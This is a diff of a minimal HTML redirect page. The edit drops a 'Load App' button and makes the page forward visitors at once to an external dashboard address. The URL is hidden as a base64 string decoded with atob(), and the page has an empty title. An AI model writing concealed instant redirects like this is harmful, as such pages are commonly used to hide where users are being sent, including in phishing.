@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- Instant fallback meta redirect for strict mobile browsers -->
+    
     <meta http-equiv="refresh" content="0;url=https://dashboard-v1-render.vercel.app/">
     <title></title>
     <style>
@@ -11,39 +11,13 @@
             background: #0d0f17;
             margin: 0;
             height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-        .tap-btn {
-            background: #5855ff;
-            color: #ffffff;
-            border: none;
-            padding: 14px 28px;
-            font-size: 16px;
-            font-weight: 600;
-            border-radius: 25px;
-            cursor: pointer;
-            box-shadow: 0 4px 15px rgba(88, 85, 255, 0.4);
         }
     </style>
 </head>
 <body>
-
-    
-    <button class="tap-btn" onclick="goNow()">Load App</button>
-
     <script>
-        function goNow() {
-            const targetPath = atob("aHR0cHM6Ly9kYXNoYm9hcmQtdjEtcmVuZGVyLnZlcmNlbC5hcHAv");
-            window.location.href = targetPath;
-        }
-
        
-        setTimeout(() => {
-            goNow();
-        }, 300);
+        window.location.replace(atob("aHR0cHM6Ly9kYXNoYm9hcmQtdjEtcmVuZGVyLnZlcmNlbC5hcHAv"));
     </script>
 </body>
 </html>
